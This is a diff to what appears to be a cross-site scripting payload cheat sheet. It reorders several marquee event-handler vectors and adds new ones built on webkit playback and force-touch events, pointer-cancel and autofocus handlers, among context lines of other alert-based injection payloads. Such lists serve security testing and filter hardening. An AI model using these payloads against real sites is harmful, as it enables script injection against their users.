@@ -28,6 +28,9 @@
 <svg><use href=\"//subdomain1.portswigger-labs.net/use_element/upload.php#x\" /></svg>
 <img src=validimage.png onloadstart=alert(1)>
 <input type=image onloadend=alert(1) src=validimage.png>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>
+<marquee onstart=alert(1)>XSS<\/marquee>
 <script>alert(document.domain)<\/script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
 <x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)<\/x:script>
@@ -390,7 +393,6 @@ code
 <svg><set onbegin=alert(1) attributename=x dur=1s>
 <svg><animate onbegin=alert(1) attributeName=x dur=1s>
 <* onblur=alert(1) id=x tabindex=1 style=display:block>test</*><input value=clickme>
-<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>
 <video oncanplay=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
 <audio oncanplay=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <video oncanplaythrough=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
@@ -430,7 +432,6 @@ code
 <audio src\/onerror=alert(1)>
 <object onerror=alert(1) data=1 type=image\/gif>
 <embed src=1 onerror=alert(1) type=image\/gif>
-<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>test<\/textarea>
@@ -935,7 +936,6 @@ code
 <audio autoplay controls onseeking=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
 <input onselect=alert(1) value=\"XSS\" autofocus>
 <textarea onselect=alert(1) autofocus>XSS<\/textarea>
-<marquee onstart=alert(1)>XSS<\/marquee>
 <form onsubmit=alert(1)><input type=submit>
 <video controls autoplay ontimeupdate=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>
 <audio controls autoplay ontimeupdate=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>
@@ -957,6 +957,15 @@ code
 <* onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:100px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test<\/span><\/*>
 <button popovertarget=x>Click me</button><* onbeforetoggle=alert(1) popover id=x>XSS<\/*>
 <button popovertarget=x>Click me</button><* ontoggle=alert(1) popover id=x>XSS<\/*>
+<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>
+<video onwebkitplaybacktargetavailabilitychanged=alert(1)>
+<* onfocus=alert(1) autofocus tabindex=1>
+<* onpointercancel=alert(1)>XSS<\/*>
+<* onwebkitmouseforcechanged=alert(1)>XSS<\/*>
+<* onwebkitmouseforcewillbegin=alert(1)>XSS<\/*>
+<* onwebkitmouseforceup=alert(1)>XSS<\/*>
+<* onwebkitmouseforcedown=alert(1)>XSS<\/*>
+<* onwebkitwillrevealbottom=alert(1)>XSS<\/*>
 <xss class=progress-bar-animated onanimationstart=alert(1)>
 <xss class=\"carousel slide\" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class=\"carousel-item active\"></xss><xss class=carousel-item></xss></xss></xss>
 <script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>
